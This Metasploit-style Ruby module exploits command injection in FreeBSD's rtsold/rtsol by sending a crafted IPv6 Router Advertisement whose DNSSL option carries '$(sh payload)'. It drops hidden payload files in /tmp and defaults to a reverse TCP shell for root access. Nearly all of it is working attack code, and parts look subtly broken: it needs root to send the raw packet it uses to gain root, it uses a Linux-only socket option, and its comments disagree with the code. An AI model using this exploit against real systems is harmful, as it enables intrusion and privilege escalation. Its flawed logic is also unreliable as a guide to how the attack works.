##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Local
  Rank = ExcellentRanking

  include Msf::Post::File
  include Msf::Post::Unix
  include Msf::Exploit::EXE
  include Msf::Exploit::FileDropper

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'FreeBSD rtsold/rtsol DNSSL Command Injection',
        'Description' => %q{
          This module exploits a command injection vulnerability in FreeBSD's
          rtsold(8) and rtsol(8) IPv6 router advertisement processing.

          The rtsold and rtsol programs do not validate the domain search list
          (DNSSL) options provided in router advertisement messages. The DNSSL
          option body is passed to resolvconf(8) unmodified.

          resolvconf(8) is a shell script which does not validate its input.
          Due to a lack of proper quoting, shell commands passed as input to
          resolvconf(8) may be executed.

          This module requires an existing session on a FreeBSD system where
          rtsold or rtsol is running and accepting router advertisements on
          at least one network interface.

          This module has been tested successfully on:

          FreeBSD 13.x and 14.x with rtsold enabled.
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'FreeBSD Security Team', # Discovery
          'Metasploit Community' # Module
        ],
        'DisclosureDate' => '2025-01-14',
        'Platform' => ['bsd'], # FreeBSD
        'Arch' => [ARCH_X64, ARCH_X86],
        'SessionTypes' => ['shell', 'meterpreter'],
        'References' => [
          ['CVE', '2025-14558'],
          ['URL', 'https://www.freebsd.org/security/advisories/FreeBSD-SA-25:12.rtsold.asc'],
          ['URL', 'https://github.com/rapid7/metasploit-framework/issues/20789']
        ],
        'Targets' => [
          [
            'FreeBSD (Automatic)',
            {
              'Arch' => [ARCH_X64, ARCH_X86]
            }
          ]
        ],
        'DefaultOptions' => {
          'PAYLOAD' => 'bsd/x64/shell_reverse_tcp',
          'PrependFork' => true,
          'WfsDelay' => 5
        },
        'Notes' => {
          'Reliability' => [REPEATABLE_SESSION],
          'Stability' => [CRASH_SAFE],
          'SideEffects' => [ARTIFACTS_ON_DISK, IOC_IN_LOGS, CONFIG_CHANGES]
        },
        'DefaultTarget' => 0
      )
    )
    register_advanced_options([
      OptString.new('WritableDir', [true, 'A directory where we can write files', '/tmp']),
      OptString.new('Interface', [false, 'Network interface to check (empty for auto-detect)', ''])
    ])
  end

  def base_dir
    datastore['WritableDir'].to_s
  end

  def check
    # Check if running on FreeBSD
    kernel_version = cmd_exec('uname -s').to_s.strip

    unless kernel_version.include?('FreeBSD')
      return CheckCode::Safe('Target system is not FreeBSD')
    end

    vprint_good('System is FreeBSD')

    # Get FreeBSD version
    release = cmd_exec('uname -r').to_s.strip
    vprint_status("FreeBSD version: #{release}")

    # Check if rtsold or rtsol is running
    rtsold_running = cmd_exec('pgrep -l rtsold').to_s
    rtsol_running = cmd_exec('pgrep -l rtsol').to_s

    unless rtsold_running.include?('rtsold') || rtsol_running.include?('rtsol')
      return CheckCode::Safe('Neither rtsold nor rtsol is running')
    end

    vprint_good('rtsold or rtsol is running')

    # Check if any interface is configured to accept router advertisements
    ifconfig_output = cmd_exec('ifconfig -a').to_s
    unless ifconfig_output.include?('ACCEPT_RTADV')
      return CheckCode::Safe('No interface is configured to accept router advertisements')
    end

    vprint_good('At least one interface accepts router advertisements')

    # Check if resolvconf exists
    unless command_exists?('resolvconf')
      return CheckCode::Safe('resolvconf is not installed')
    end

    vprint_good('resolvconf is installed')

    # Parse version to check if vulnerable
    # The vulnerability was announced in January 2025, affecting versions before patches
    # FreeBSD 13.4-RELEASE-p2, 14.2-RELEASE-p1, 15.0-RELEASE-p1
    version_major = release.split('.')[0].to_i

    case version_major
    when 15
      CheckCode::Appears('FreeBSD 15.x - potentially vulnerable if not patched')
    when 14
      CheckCode::Appears('FreeBSD 14.x - potentially vulnerable if not patched')
    when 13
      CheckCode::Appears('FreeBSD 13.x - potentially vulnerable if not patched')
    else
      CheckCode::Appears('FreeBSD - potentially vulnerable if not patched')
    end
  end

  def exploit
    if !datastore['ForceExploit'] && is_root?
      fail_with(Failure::BadConfig, 'Session already has root privileges. Set ForceExploit to override.')
    end

    unless writable?(base_dir)
      fail_with(Failure::BadConfig, "#{base_dir} is not writable")
    end

    # Find an interface that accepts router advertisements
    interface = find_accepting_interface
    unless interface
      fail_with(Failure::NotVulnerable, 'No interface found that accepts router advertisements')
    end

    print_status("Using interface: #{interface}")

    # Create payload script
    payload_path = "#{base_dir}/.#{rand_text_alphanumeric(5..10)}.sh"
    
    print_status('Creating payload script...')
    payload_script = generate_payload_script(payload_path)
    upload(payload_path, payload_script)
    cmd_exec("chmod +x '#{payload_path}'")

    # Create Python script to send malicious IPv6 RA with DNSSL option
    ra_script_path = "#{base_dir}/.#{rand_text_alphanumeric(5..10)}.py"
    
    print_status('Creating IPv6 RA injection script...')
    ra_script = generate_ra_script(interface, payload_path)
    upload(ra_script_path, ra_script)

    print_status('Sending malicious IPv6 Router Advertisement with DNSSL payload...')
    
    # Execute the RA injection script
    # Need to run with privileges if available
    output = cmd_exec("python3 '#{ra_script_path}' 2>&1", nil, 15).to_s
    
    if output.include?('Error') || output.include?('error')
      print_warning("RA injection may have failed: #{output}")
      # Try alternative method using scapy if available
      print_status('Attempting alternative injection method...')
      alt_output = cmd_exec("python2 '#{ra_script_path}' 2>&1", nil, 15).to_s
      print_warning("Alternative attempt output: #{alt_output}") unless alt_output.blank?
    else
      vprint_status("RA injection output: #{output}")
    end

    print_status('Waiting for payload execution...')
    sleep(datastore['WfsDelay'])

    # Check if we got elevated privileges
    if is_root?
      print_good('Success! Payload executed with root privileges')
    else
      print_status('Payload may have executed - check handler for sessions')
    end
  end

  private

  def find_accepting_interface
    # Find first interface with ACCEPT_RTADV flag
    ifconfig_output = cmd_exec('ifconfig -a').to_s
    
    # Parse ifconfig output to find interfaces
    current_interface = nil
    ifconfig_output.each_line do |line|
      if line =~ /^(\w+\d+):/
        current_interface = ::Regexp.last_match(1)
      elsif line.include?('ACCEPT_RTADV') && current_interface
        return current_interface
      end
    end

    # If no interface found with ACCEPT_RTADV, try manual interface
    manual_interface = datastore['Interface']
    return manual_interface unless manual_interface.blank?

    nil
  end

  def generate_payload_script(payload_path)
    # Generate a shell script that will execute our payload
    # This needs to work even in a restricted environment
    payload_exe = generate_payload_exe
    payload_exe_path = payload_path.gsub('.sh', '')
    
    upload_and_chmodx(payload_exe_path, payload_exe)
    register_file_for_cleanup(payload_exe_path)

    # Shell-escape the payload path to prevent any issues
    escaped_path = payload_exe_path.gsub("'", "'\\\\''")
    
    <<~SCRIPT
      #!/bin/sh
      # Execute payload
      nohup '#{escaped_path}' >/dev/null 2>&1 &
    SCRIPT
  end

  def generate_ra_script(interface, payload_path)
    # Generate Python script to craft and send malicious IPv6 RA
    # The DNSSL option will contain our command injection payload
    
    # Command injection payload - shell escape for safety
    # The vulnerability is that resolvconf doesn't properly quote the DNSSL value
    # So we can inject: search $(command) or search `command` or search ;command;
    injection_cmd = payload_path.gsub("'", "'\"'\"'")

    <<~PYTHON
      #!/usr/bin/env python3
      import socket
      import struct
      import sys
      from time import sleep

      def create_icmpv6_ra_with_dnssl(interface, payload_cmd):
          """
          Create an IPv6 Router Advertisement packet with malicious DNSSL option
          that exploits command injection in resolvconf
          """
          
          # ICMPv6 Router Advertisement
          # Type: 134 (0x86), Code: 0
          icmp_type = 134
          icmp_code = 0
          icmp_checksum = 0  # Will be calculated by kernel
          
          # Router Advertisement fields
          cur_hop_limit = 64
          flags = 0  # No flags
          router_lifetime = 1800
          reachable_time = 0
          retrans_timer = 0
          
          # Build RA header
          ra_header = struct.pack('!BBHBBHII',
              icmp_type, icmp_code, icmp_checksum,
              cur_hop_limit, flags, router_lifetime,
              reachable_time, retrans_timer
          )
          
          # DNSSL Option (Type 31, RFC 6106)
          # The vulnerability: resolvconf doesn't sanitize this data
          # Format: Type (1), Length (1), Reserved (2), Lifetime (4), Domain Names (variable)
          
          # Craft malicious domain name with command injection
          # Using backtick command substitution: `command`
          malicious_domain = b'$(sh ' + payload_cmd.encode() + b')'
          
          # Pad domain name to 8-byte boundary
          domain_encoded = encode_domain_name(malicious_domain)
          
          # Calculate length in 8-byte units
          option_length = (len(domain_encoded) + 8) // 8
          if (len(domain_encoded) + 8) % 8 != 0:
              option_length += 1
              
          # Pad to correct length
          total_option_bytes = option_length * 8
          domain_padded = domain_encoded + b'\\\\x00' * (total_option_bytes - 8 - len(domain_encoded))
          
          dnssl_option = struct.pack('!BBH',
              31,  # Type: DNSSL
              option_length,  # Length in 8-byte units
              0    # Reserved
          )
          dnssl_option += struct.pack('!I', 3600)  # Lifetime
          dnssl_option += domain_padded
          
          # Complete packet
          packet = ra_header + dnssl_option
          
          return packet

      def encode_domain_name(domain):
          """Encode domain name in DNS format (label length + label)"""
          # Simple encoding - just add length prefix
          # For command injection, we don't need valid DNS encoding
          encoded = b''
          parts = domain.split(b'.')
          for part in parts:
              if len(part) > 0:
                  encoded += bytes([len(part)]) + part
          encoded += b'\\\\x00'  # Null terminator
          return encoded

      def send_ra(interface, payload_cmd):
          """Send the malicious RA packet"""
          try:
              # Create raw ICMPv6 socket
              s = socket.socket(socket.AF_INET6, socket.SOCK_RAW, socket.IPPROTO_ICMPV6)
              
              # Set socket options
              s.setsockopt(socket.IPPROTO_IPV6, socket.IPV6_MULTICAST_HOPS, 255)
              
              # Bind to interface
              try:
                  s.setsockopt(socket.SOL_SOCKET, 25, (interface + '\\\\x00').encode())  # SO_BINDTODEVICE
              except:
                  print(f"Warning: Could not bind to interface {interface}")
              
              # Create packet
              packet = create_icmpv6_ra_with_dnssl(interface, payload_cmd)
              
              # Send to all-nodes multicast address
              dest = ('ff02::1', 0, 0, 0)
              
              print(f"Sending malicious RA on {interface}...")
              s.sendto(packet, dest)
              print("RA sent successfully")
              
              s.close()
              return True
              
          except PermissionError:
              print("Error: Need root privileges to send raw ICMPv6 packets")
              return False
          except Exception as e:
              print(f"Error sending RA: {e}")
              return False

      if __name__ == "__main__":
          interface = "#{interface}"
          payload_cmd = "#{injection_cmd}"
          
          if not send_ra(interface, payload_cmd):
              sys.exit(1)
              
          sys.exit(0)
    PYTHON
  end

  def upload(path, data)
    print_status("Writing '#{path}' (#{data.size} bytes) ...")
    rm_f(path)
    write_file(path, data)
    register_file_for_cleanup(path)
  end
end
